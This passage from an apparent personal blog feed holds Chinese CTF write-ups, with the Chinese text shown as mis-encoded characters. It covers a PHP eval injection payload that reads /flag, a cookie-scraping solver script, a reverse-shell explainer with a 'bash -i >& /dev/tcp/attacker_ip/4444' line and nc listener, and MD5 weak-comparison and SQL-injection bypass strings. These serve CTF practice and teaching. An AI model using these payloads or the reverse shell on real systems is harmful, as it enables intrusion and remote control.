class="hljs-string">&#x27;/tmp/data.json&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] == <span class="hljs-string">&#x27;read&#x27;</span>) &#123;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/tmp/data.json&#x27;</span>);<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$data = &#x27;</span> . <span class="hljs-variable">$data</span> . <span class="hljs-string">&#x27;;&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$data</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>æ¥å—modeå‚æ•°,å‚æ•°å€¼ä¸ºsaveä¸ºä¿å­˜æ¨¡å¼:</p><ul><li>ä» <code>/tmp/data.json</code> æ–‡ä»¶è¯»å–åŸæœ‰å†…å®¹ï¼ˆå‡è®¾æ˜¯ä¸€ä¸ªæ•°ç»„æ ¼å¼ï¼Œå¦‚ <code>[&#39;a&#39;, &#39;b&#39;]</code>ï¼‰ã€‚</li><li>è·å– URL å‚æ•° <code>value</code>ï¼Œä¾‹å¦‚ <code>?mode=save&amp;value=hello</code>ã€‚</li><li>ç”¨ <code>addslashes()</code> å¤„ç†ï¼ˆè½¬ä¹‰å¼•å·ç­‰ï¼‰ï¼Œé˜²æ­¢å­—ç¬¦ä¸²ç ´åç»“æ„ã€‚</li><li>ç”¨ <code>str_replace()</code> åœ¨ <code>]</code> å‰æ’å…¥æ–°å€¼ï¼Œå½¢æˆæ–°çš„â€œæ•°ç»„â€ã€‚</li><li>å†æ¬¡å†™å›æ–‡ä»¶ã€‚</li></ul><p>ä¾‹å¦‚ï¼Œdata,jsonçš„å†…å®¹ä¸ºï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">1,<span class="hljs-string">&quot;Leaf&quot;</span>,1234</span>]<br></code></pre></td></tr></table></figure><p>ç„¶åå°†valueå€¼ä¸º6666ï¼Œæ‰§è¡Œä»£ç åï¼Œdata.jsonä¸­çš„å†…å®¹å°±å˜ä¸ºï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">1,<span class="hljs-string">&quot;Leaf&quot;</span>,1234,6666</span>]<br></code></pre></td></tr></table></figure><p>è‡ªç„¶æƒ³åˆ°å¯ä»¥åˆ©ç”¨sqlæ³¨å…¥çš„æ€è·¯ï¼Œåœ¨jsonä¸­æ³¨é‡Šç¬¦ä¸º<code>//</code>ï¼Œæ‰€ä»¥å°†valueçš„å€¼å˜ä¸º<code>]//</code>ï¼Œé‚£ä¹ˆåé¢çš„ä»£ç å°±ä¼šè¢«æ³¨é‡Šæ‰ã€‚</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">[<span class="hljs-meta">1,<span class="hljs-string">&quot;Leaf&quot;</span>,1234</span>]<span class="hljs-comment">//,]</span><br></code></pre></td></tr></table></figure><p>å†çœ‹åç»­readæ¨¡å¼ä¼šæŠŠ<code>/tmp/data.json</code>ä¸­å†…å®¹è¯»å–ç„¶åå¸¦ç€phpä»£ç æ‰§è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ¥è¿›è¡ŒRCEã€‚</p><p>ä»¥ä¸‹ä¸ºreadæ¨¡å¼è¿‡ç¨‹è§£é‡Šï¼š</p><p>modeå‚æ•°å€¼ä¸ºreadä¸ºè¯»å–æ¨¡å¼</p><ul><li>ä»æ–‡ä»¶è¯»å–å†…å®¹ï¼ˆå¦‚ <code>[&#39;apple&#39;, &#39;banana&#39;]</code>ï¼‰ã€‚</li><li>ä½¿ç”¨ <code>eval()</code> æŠŠå­—ç¬¦ä¸²å½“ä½œ PHP ä»£ç æ‰§è¡Œï¼Œç›¸å½“äºï¼š</li></ul><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$data = [<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>]<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ul><li>ç„¶åè¾“å‡ºæ•°ç»„å†…å®¹ã€‚</li></ul><p>æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„saveæ¨¡å¼ä¸­<code>addslashes()</code>å‡½æ•°çš„ä½œç”¨ï¼š</p><p><code>addslashes()</code> æ˜¯ PHP çš„å†…ç½®å‡½æ•°ï¼Œç”¨æ¥åœ¨å­—ç¬¦ä¸²ä¸­ä¸ºä»¥ä¸‹ <strong>4 ä¸ªå­—ç¬¦</strong> è‡ªåŠ¨æ·»åŠ åæ–œæ è½¬ä¹‰ï¼ˆbackslashï¼‰ï¼š</p><ul><li>å•å¼•å· <code>&#39;</code> -&gt; <code>\&#39;</code></li><li>åŒå¼•å· <code>&quot;</code> -&gt; <code>\&quot;</code></li><li>åæ–œæ  <code>\</code> -&gt; <code>\\</code></li><li>NUL å­—ç¬¦ï¼ˆASCII 0ï¼Œ<code>&quot;\0&quot;</code>ï¼‰ -&gt; <code>\0</code></li></ul><p>æ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å…ˆé€‰æ‹©saveæ¨¡å¼ï¼Œç„¶åé€šè¿‡valueä¼ é€’payloadï¼Œç„¶åå†é€‰æ‹©readæ¨¡å¼è¯»å–è¾¾åˆ°RCEã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ç¼–å†™payloadçš„é—®é¢˜ï¼šä¸ºäº†èƒ½å¤Ÿä½¿æˆ‘ä»¬çš„payloadèƒ½æ‰§è¡Œï¼Œæˆ‘ä»¬å…ˆè¦é—­åˆç¬¬ä¸€ä¸ª<code>]</code>è¿™é‡Œå‰é¢å·²ç»æåˆ°è¿‡ï¼Œé€šè¿‡ä¼ é€’<code>]//</code>ï¼Œä¹‹å<code>\n</code>æ¢è¡Œåœ¨æ–°çš„è¡Œä¸­å†™è¦æ‰§è¡Œçš„phpä»£ç <code>echo &#39;cat/flag&#39;//</code></p><p>åˆå› ä¸º<code>addslashes()</code>å‡½æ•°ä¼šæŠŠå•å¼•å·è½¬ä¹‰ï¼Œæˆ‘ä»¬æŠŠ<code>&#39;</code>æ›¿æ¢æˆåå¼•å·</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">]<span class="hljs-string">//</span>\n;<span class="hljs-keyword">echo</span> `cat <span class="hljs-string">/flag</span>`;<span class="hljs-string">//</span><br></code></pre></td></tr></table></figure><p>æ¢è¡Œè·Ÿç©ºæ ¼éœ€è¦base64ç¼–ç ä¸€ä¸‹ï¼Œæœ€åå¾—åˆ°çš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?mode=save&amp;value=]//<span class="hljs-variable">%0a</span>;echo<span class="hljs-variable">%20</span><span class="hljs-string">`cat%20/flag`</span>;<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>æœ€å<code>?mode=read</code>è¯»å–åˆ°flag</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-11-04_22-05-58.png" alt="PixPin_2025-11-04_22-05-58"></p><h1 id="references"><a href="#references" class="headerlink" title="references"></a>references</h1><p>[<a href="https://blog.csdn.net/Leaf_initial/article/details/131560501">NSSCTF Round #13]webä¸“é¡¹èµ›wp_[nssround#13 basic]timetrcer-CSDNåšå®¢</a></p><p><a href="https://blog.csdn.net/gitblog_09122/article/details/142229324">Flask Session Cookie Manager å®‰è£…å’Œé…ç½®æŒ‡å—-CSDNåšå®¢</a></p><p>[<a href="https://www.cnblogs.com/magic123/articles/17512689.html">NSSRound#13 Basic]ez_factors - Magicæ°´ç“¶ - åšå®¢å›­</a></p><p><a href="https://github.com/Paradoxis/Flask-Unsign">GitHub - Paradoxis&#x2F;Flask-Unsignï¼šå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºé€šè¿‡çŒœæµ‹å¯†é’¥æ¥è·å–ã€è§£ç ã€æš´åŠ›ç ´è§£å’Œåˆ¶ä½œ Flask åº”ç”¨ç¨‹åºçš„ä¼šè¯ cookieã€‚ â€” GitHub - Paradoxis&#x2F;Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.</a></p><p>[<a href="https://blog.csdn.net/m0_73512445/article/details/133964825">NSSRound#13 Basic] åˆ·é¢˜è®°å½•_[nssround#13 basic]flask?jwt?(hard)-CSDNåšå®¢</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[b01lers 2020]Scarambled</title>
    <link href="/2025/11/04/b01lers-2020-Scarambled/"/>
    <url>/2025/11/04/b01lers-2020-Scarambled/</url>
    
    <content type="html"><![CDATA[<h1 id="b01lers-2020-Scarambled"><a href="#b01lers-2020-Scarambled" class="headerlink" title="[b01lers 2020]Scarambled"></a>[b01lers 2020]Scarambled</h1><p>ä¸€é“å¾ˆæœ‰æ„æ€çš„é¢˜ã€‚</p><p>ç½‘é¡µè°ƒç”¨äº†ä¸€ä¸ªyoutubeçš„è§†é¢‘ã€‚</p><p>è§‚å¯Ÿåˆ°cookieä¸­æœ‰ä¸¤ä¸ªç‰¹åˆ«çš„å€¼<code>frequencyå’Œ</code> <code>tranmissions</code>æ¯ä¸€æ¬¡ç‚¹å‡»ç½‘é¡µä¸­<code>reload</code> å‘ç°<code>frequency</code>ä¼šå¢åŠ 1ï¼Œ<code>tranmissions</code>ä¸­è¢«kxkxkxkxshåŒ…è£¹çš„ä¸­é—´éƒ¨åˆ†ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104115200747.png" alt="image-20251104115200747"></p><p>å‡å¦‚æŠŠkxkxkxkxshéƒ¨åˆ†å¿½ç•¥æ‰ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†åˆ†æˆä¸‰éƒ¨åˆ†ï¼š1(çº¢ç®­å¤´)2(é»„ç®­å¤´)3(é»„çº¿)</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104121513715.png" alt="image-20251104121513715"></p><p>è®°å½•ä¸‹æ¥ä¸€äº›æ•°æ®ï¼Œæˆ‘ä»¬ä¼šå‘ç°</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104121011106.png" alt="image-20251104121011106"></p><p>æ•°æ®ä¸­ç¬¬ä¸‰éƒ¨åˆ†ä»£è¡¨æ•°æ®ç¬¬äºŒéƒ¨åˆ†çš„ä½ç½®ï¼Œç¬¬ä¸€éƒ¨åˆ†ä»£è¡¨å®ƒå­˜åœ¨äºç¬¬äºŒéƒ¨åˆ†çš„å‰ä¸€ä¸ªä½ç½®ã€‚</p><p>æ¯”å¦‚è¯´frequency22ä¸­ï¼š ç¬¬ä¸‰éƒ¨åˆ†20ä»£è¡¨4åœ¨ç¬¬äºŒåä¸ªä½ç½®ï¼Œé‚£ä¹ˆ-åœ¨ç¬¬19ä¸ªä½ç½®ï¼Œåˆšå¥½ä¸frequency10å¯¹åº”ã€‚ç”šè‡³å¯ä»¥çœ‹åˆ°frequency25ä¸­æ˜¾ç¤ºCT,åƒæ˜¯CTFçš„ä¸€éƒ¨åˆ†ï¼ŒçŒœæµ‹å®Œå…¨æ‹¼æ¥åä¼šå¾—åˆ°flagã€‚å‘ç°å°è¯•ç¼–å†™è„šæœ¬ï¼Œåˆ·æ–°é¡µé¢ä¸æ–­è·å–transmissionsä¸­å˜åŒ–çš„æ•°æ®ï¼ŒæŒ‰ç…§è§„å¾‹æŠŠä»–ä»¬æ‹¼æ¥èµ·æ¥åº”è¯¥èƒ½å¾—åˆ°flagã€‚</p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote<br><br>url = <span class="hljs-string">&#x27;http://d1653c98-47b9-4f04-b138-71cf1c76520c.node3.buuoj.cn/&#x27;</span><br>sess = requests.Session()<br><br><span class="hljs-comment"># å‡è®¾æˆ‘ä»¬é¢„æœŸç´¢å¼•ä¸ä¼šè¶…è¿‡ 200ï¼ˆå¯æ ¹æ®å®é™…è°ƒæ•´ï¼‰</span><br>MAX_INDEX = <span class="hljs-number">200</span><br>data = [<span class="hljs-string">&#x27;&#x27;</span>] * MAX_INDEX<br>attempts = <span class="hljs-number">300</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(attempts):<br>    <span class="hljs-keyword">try</span>:<br>        resp = sess.get(url, timeout=<span class="hljs-number">5</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] è¯·æ±‚å¤±è´¥: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><br>    cj = resp.cookies<br>    cookies_dict = requests.utils.dict_from_cookiejar(cj)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;transmissions&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> cookies_dict:<br>        <span class="hljs-comment"># å¦‚æœæ²¡æœ‰è¯¥ cookieï¼Œè·³è¿‡è¿™æ¬¡</span><br>        <span class="hljs-keyword">continue</span><br><br>    raw = cookies_dict[<span class="hljs-string">&#x27;transmissions&#x27;</span>].replace(<span class="hljs-string">&#x27;kxkxkxkxsh&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    decoded = unquote(raw)<br><br>    <span class="hljs-comment"># ç®€å•çš„æ ¼å¼æ£€æŸ¥ï¼šè‡³å°‘è¦æœ‰ 3 ä¸ªå­—ç¬¦ï¼ˆç”¨äº [0:1] å’Œ [2:]ï¼‰</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(decoded) &lt; <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">continue</span><br><br>    key_str = decoded[<span class="hljs-number">2</span>:]<br>    val = decoded[<span class="hljs-number">0</span>:<span class="hljs-number">1</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> key_str.isdigit():<br>        <span class="hljs-comment"># å¦‚æœç´¢å¼•ä¸æ˜¯æ•°å­—ï¼Œè·³è¿‡</span><br>        <span class="hljs-keyword">continue</span><br><br>    idx = <span class="hljs-built_in">int</span>(key_str)<br>    <span class="hljs-keyword">if</span> idx &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> idx &gt;= MAX_INDEX:<br>        <span class="hljs-comment"># ç´¢å¼•è¶…å‡ºé¢„æœŸèŒƒå›´ï¼Œè·³è¿‡æˆ–è°ƒæ•´ MAX_INDEX</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] è·³è¿‡ä¸åˆç†ç´¢å¼•: <span class="hljs-subst">&#123;idx&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">continue</span><br><br>    <span class="hljs-comment"># å†™å…¥ï¼ˆå¦‚æœæƒ³é¿å…è¦†ç›–ï¼Œå¯ä»¥å…ˆåˆ¤æ–­æ˜¯å¦å·²å¡«å……ï¼‰</span><br>    <span class="hljs-keyword">if</span> data[idx] == <span class="hljs-string">&#x27;&#x27;</span>:<br>        data[idx] = val<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># å·²å­˜åœ¨ï¼Œå¯ä»¥é€‰æ‹©ä¿ç•™åŸå€¼æˆ–æ›¿æ¢ï¼Œè§†åœºæ™¯å†³å®š</span><br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-comment"># è¾“å‡ºéç©ºå­—ç¬¦æ‹¼æ¥æˆå­—ç¬¦ä¸²</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(ch <span class="hljs-keyword">if</span> ch != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;?&#x27;</span> <span class="hljs-keyword">for</span> ch <span class="hljs-keyword">in</span> data)<br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251104123029383.png" alt="image-20251104123029383"></p><h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a href="https://github.com/m3ssap0/CTF-Writeups/blob/master/b01lers%20CTF%202020/Scrambled/README.md">https://github.com/m3ssap0/CTF-Writeups/blob/master/b01lers%20CTF%202020/Scrambled/README.md</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰</title>
    <link href="/2025/10/26/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%88%E9%97%AE3%EF%BC%89/"/>
    <url>/2025/10/26/%E9%99%87%E5%89%91%E6%9D%AF-2021-%E7%AE%80%E5%8D%95%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%EF%BC%88%E9%97%AE3%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="é™‡å‰‘æ¯-2021-ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰"><a href="#é™‡å‰‘æ¯-2021-ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰" class="headerlink" title="[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰"></a>[é™‡å‰‘æ¯ 2021]ç®€å•æ—¥å¿—åˆ†æï¼ˆé—®3ï¼‰</h1><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-26_14-33-16.png" alt="PixPin_2025-10-26_14-33-16"></p><p>å…ˆè§£é‡Šä¸€ä¸‹ä»€ä¹ˆæ˜¯åå¼¹shell,</p><p>â€œåå¼¹ shellâ€ï¼ˆreverse shellï¼‰æ˜¯æ¸—é€æµ‹è¯•å’Œç½‘ç»œå®‰å…¨ä¸­éå¸¸æ ¸å¿ƒçš„æ¦‚å¿µä¹‹ä¸€ã€‚<br> ç®€å•è¯´ï¼šå®ƒæ˜¯ä¸€ç§<strong>è®©è¢«æ§ä¸»æœºä¸»åŠ¨è¿æ¥æ”»å‡»è€…ä¸»æœºï¼Œä»è€Œè·å¾—äº¤äº’å¼å‘½ä»¤è¡Œæ§åˆ¶æƒ</strong>çš„æ–¹å¼ã€‚</p><p>åœ¨æ­£å¸¸æƒ…å†µï¼ˆæ­£å‘ shellï¼‰ä¸‹ï¼Œæ˜¯æ”»å‡»è€…ä¸»åŠ¨è¿æ¥ç›®æ ‡ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> target_ip <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯â€œæˆ‘å»æ‰¾ä½ â€ã€‚</p><p>è€Œ<strong>åå¼¹ shell æ˜¯ç›¸åçš„æ–¹å‘</strong>ï¼šè¢«æ”»å‡»çš„æœºå™¨ä¸»åŠ¨â€œåå¼¹â€ä¸€ä¸ªè¿æ¥å›æ”»å‡»è€…ã€‚<br> æ¢å¥è¯è¯´ï¼š<strong>â€œä½ æ¥æ‰¾æˆ‘â€</strong>ã€‚</p><p>ä¾‹å¦‚ï¼Œæ”»å‡»è€…åœ¨è‡ªå·±çš„ç”µè„‘ä¸Šç›‘å¬ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">4444</span><br></code></pre></td></tr></table></figure><p>ç„¶åè®©ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/attacker_ip/<span class="hljs-number">4444</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ç›®æ ‡ä¸»æœºä¼šä¸»åŠ¨è¿åˆ°æ”»å‡»è€…çš„ç›‘å¬ç«¯å£ï¼Œæ”»å‡»è€…å°±è·å¾—äº†ä¸€ä¸ª shellã€‚</p><p> æŸ¥çœ‹ä¸€ä¸‹æ—¥å¿—ï¼Œæœ‰ä¸‰æ®µbase64ç¼–ç å­—ç¬¦ä¸²ï¼Œä¾æ¬¡è§£ç </p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-03-35.png" alt="PixPin_2025-10-25_23-03-35"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-04-36.png" alt="PixPin_2025-10-25_23-04-36"></p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-25_23-05-48.png" alt="PixPin_2025-10-25_23-05-48"></p><p>å¾ˆæ˜æ˜¾ç¬¬ä¸‰æ®µæ˜¯åœ¨åå¼¹shellã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>NSSCTF</tag>
      
      <tag>æ—¥å¿—åˆ†æ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SWPU 2020]å¥—å¨ƒ</title>
    <link href="/2025/10/24/SWPU-2020-%E5%A5%97%E5%A8%83/"/>
    <url>/2025/10/24/SWPU-2020-%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPU-2020-å¥—å¨ƒ"><a href="#SWPU-2020-å¥—å¨ƒ" class="headerlink" title="[SWPU 2020]å¥—å¨ƒ"></a>[SWPU 2020]å¥—å¨ƒ</h1><p>ä¸‹è½½å¥½çš„é™„ä»¶æ‰“ä¸å¼€ï¼Œä¸è¿‡å› ä¸ºxlsxæœ¬æ¥å°±æ˜¯å‹ç¼©åŒ…çš„ä¸€ç§ï¼Œæˆ‘ä»¬ç›´æ¥ä¿®æ”¹æ”¹åç¼€æ‰“å¼€ã€‚</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_13-02-41-1761283497046-5.png" alt="PixPin_2025-10-24_13-02-41"></p><p>å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251024130518471.png" alt="image-20251024130518471"></p><p><code>RCE4data.txt</code>çš„æ–‡ä»¶å†…å®¹æ˜¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">U2FsdGVkX19uI2lzmxYrQ9mc16y7la7qc7VTS8gLaUKa49gzXPclxRXVsRJxWz/p<br></code></pre></td></tr></table></figure><p>æ ¹æ®æ–‡ä»¶åæ¥çœ‹åº”è¯¥æ˜¯RCE4åŠ å¯†çš„å¯†æ–‡ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰keyã€‚</p><p>å¦ä¸€ä¸ªswpu.xlsæˆ‘ä»¬è¿˜æ˜¯æ”¹æˆzip,ç„¶åæ‰“å¼€æ²¡æ˜¾ç¤ºå†…å®¹ç”¨è®°äº‹æœ¬æ‰“å¼€å±…ç„¶æ˜¾ç¤ºäº†å¯†ç ï¼š</p><p><img src="D:\work\notebook\ontebook\CTF\é¢˜ç›®å¤ç°\NSSCTFæ¯æ—¥ä¸€é¢˜\assets\PixPin_2025-10-24_13-17-46-1761283498591-7.png" alt="PixPin_2025-10-24_13-17-46"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">password</span>:<span class="hljs-number">6</span>e4c834d77cba03af41e1562a5bce84e<br></code></pre></td></tr></table></figure><p>zipé‡Œè¿˜æœ‰ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œåº”è¯¥æ˜¯å®ƒçš„å¯†ç ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_13-19-22-1761283501291-9.png" alt="PixPin_2025-10-24_13-19-22"></p><p>æ ¹æ®æ–‡ä»¶åï¼Œè¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„key,ç›´æ¥è§£å¯†</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">key:</span>ABCDEFGHIJKLMNOPQRSTUVWXYZ<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-10-24_13-20-03-1761283510577-11.png" alt="PixPin_2025-10-24_13-20-03"></p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce4</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SWPUCTF 2022 æ–°ç”Ÿèµ›]å¥‡å¦™çš„MD5</title>
    <link href="/2025/10/23/%C2%96SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5/"/>
    <url>/2025/10/23/%C2%96SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-å¥‡å¦™çš„MD5"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-å¥‡å¦™çš„MD5" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]å¥‡å¦™çš„MD5"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]å¥‡å¦™çš„MD5</h2><p>é¢˜ç›®ç•Œé¢ï¼š</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023171123659-1761210929097-17.png" alt="image-20251023171123659"></p><p>æ¯”è¾ƒç†ŸçŸ¥çš„å­—ç¬¦ä¸²ä¸€ä¸ªæ˜¯<code>0e215962017</code>md5åŠ å¯†åç»è¿‡å¼±æ¯”è¾ƒç­‰äºè‡ªèº«</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023171518437-1761210955203-20.png" alt="image-20251023171518437"></p><p>ä¸€ä¸ªæ˜¯<code>ffifdyop</code>MD5 åŠ å¯†åå˜æˆä¸‡èƒ½å¯†ç 00000000ã€‚</p><p>æäº¤ffifdyopè¿›å…¥ç¬¬äºŒå…³ï¼Œ</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023171822826-1761211135725-22.png" alt="image-20251023171822826"></p><p>æŸ¥çœ‹æºä»£ç </p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/image-20251023171931756-1761212284205-24.png" alt="image-20251023171931756"></p><p>éœ€è¦ä¼ å…¥çš„GETå‹å‚æ•°xã€ymd5å€¼ç»phpå¼±æ¯”è¾ƒç›¸åŒï¼Œå¯ä»¥æœç´¢ç›¸å…³å­—ç¬¦ä¸²æ¯”å¦‚<code>s1885207154a</code> å’Œ<code>s1836677006a</code>ä¹Ÿå¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œ</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 